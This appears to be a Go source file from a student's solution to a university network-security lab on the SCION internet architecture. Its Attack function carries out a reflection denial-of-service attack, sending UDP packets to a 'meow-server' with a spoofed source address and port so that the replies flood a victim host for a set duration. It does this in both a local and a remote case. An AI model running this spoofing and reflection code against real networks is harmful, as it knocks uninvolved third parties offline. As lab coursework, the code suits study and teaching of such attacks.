package client

import (
	// All of these imports were used for the mastersolution

	"fmt"
	"log"
	"net"

	// "sync"
	// TODO uncomment any imports you need (go optimizes away unused imports)
	"context"
	"time"

	"github.com/scionproto/scion/go/lib/addr"
	"github.com/scionproto/scion/go/lib/daemon"
	"github.com/scionproto/scion/go/lib/snet"

	// "github.com/scionproto/scion/go/lib/scion"
	"github.com/scionproto/scion/go/lib/sock/reliable"
)

type Network struct {
	snet.Network
	IA            addr.IA
	PathQuerier   snet.PathQuerier
	hostInLocalAS net.IP
}

// func GenerateAttackPayload() []byte {
// 	// Choose which request to send
// 	request := server.NewRequest("67534", false, true, true, true)
// 	fmt.Println(request.ID())
// 	// server.SetID(1)(request)
// 	// request := server.SetID(98793)
// 	// serialize the request with the API Marshal function
// 	d, err := request.MarshalJSON()
// 	if err != nil {
// 		fmt.Println(err)
// 		return make([]byte, 0) // empty paiload on fail
// 	}
// 	return d
// }

func GenerateAttackPayload() []byte {
	return make([]byte, 1)
}

func findAnyHostInLocalAS(ctx context.Context, sciondConn daemon.Connector) (net.IP, error) {
	addr, err := daemon.TopoQuerier{Connector: sciondConn}.UnderlayAnycast(ctx, addr.SvcCS)
	if err != nil {
		return nil, err
	}
	return addr.IP, nil
}

func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {

	// The following objects might be useful and you may use them in your solution,
	// but you don't HAVE to use them to solve the task.

	mewoAddr, err := snet.ParseUDPAddr(meowServerAddr)
	if err != nil {
		return err
	}

	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces

	// SCION dispatcher
	dispSockPath, err := DispatcherSocket()
	if err != nil {
		log.Fatal(err)
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)

	// SCION daemon
	sciondAddr := SCIONDAddress()
	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		log.Fatal(err)
	}

	// TODO: Reflection Task
	// Set up a scion connection with the meow-server
	// and spoof the return address to reflect to the victim.
	// Don't forget to set the spoofed source port with your
	// personalized port to get feedback from the victims.
	localIA, err := sciondConn.LocalIA(ctx)
	// localIA := spoofedAddr.IA
	if err != nil {
		return err
	}

	pathQuerier := daemon.Querier{Connector: sciondConn, IA: localIA}

	n := snet.NewNetwork(
		localIA,
		dispatcher,
		daemon.RevHandler{Connector: sciondConn},
	)
	hostInLocalAS, err := findAnyHostInLocalAS(ctx, sciondConn)
	if err != nil {
		return err
	}

	// Remote case
	if spoofedAddr.IA != mewoAddr.IA {
		flags := daemon.PathReqFlags{false, false}
		paths, _ := sciondConn.Paths(ctx, spoofedAddr.IA, mewoAddr.IA, flags)
		register, _, _ := dispatcher.Register(ctx, mewoAddr.IA, &net.UDPAddr{IP: MeowServerIP()}, addr.SvcNone)
		handle := snet.DefaultSCMPHandler{RevocationHandler: daemon.RevHandler{Connector: sciondConn}}
		conn := snet.NewSCIONPacketConn(register, handle, false)

		i := 0
		// For every path, send package to block remote
		for start := time.Now(); time.Since(start) < AttackDuration(); {
			if i == len(paths) {
				i = 0
			}
			path := paths[i].Path()
			err = path.Reverse()
			i++

			pkt := &snet.Packet{
				PacketInfo: snet.PacketInfo{
					Destination: snet.SCIONAddress{
						IA:   mewoAddr.IA,
						Host: addr.HostFromIP(MeowServerIP()),
					},
					Source: snet.SCIONAddress{
						IA:   spoofedAddr.IA,
						Host: addr.HostFromIP(RemoteVictimIP()),
					},
					Path: path,
					Payload: snet.UDPPayload{
						SrcPort: uint16(VictimPort()),
						DstPort: uint16(mewoAddr.Host.Port),
						Payload: payload,
					},
				},
			}

			err = conn.WriteTo(pkt, &net.UDPAddr{IP: MeowServerIP(), Port: DispatcherPort()})
			if err != nil {
				fmt.Println("Error encountered when writing to remote", err)
				return nil
			}
		}

	} else {
		defNetwork := Network{Network: n, IA: localIA, PathQuerier: pathQuerier, hostInLocalAS: hostInLocalAS}
		// Local case
		conn, err := defNetwork.Dial(ctx, "udp", spoofedAddr.Host, mewoAddr, addr.SvcNone)
		if err != nil {
			fmt.Println("CLIENT: Dial produced an error.", err)
		}
		defer conn.Close()

		for start := time.Now(); time.Since(start) < AttackDuration(); {
			_, err := conn.Write(payload)
			if err != nil {
				fmt.Println("CLIENT: Write produced an error.", err)
			}
			// fmt.Printf("CLIENT: Packet-written: bytes=%d addr=%s\n", bitn, meowServerAddr)
		}
	}
	return nil
}
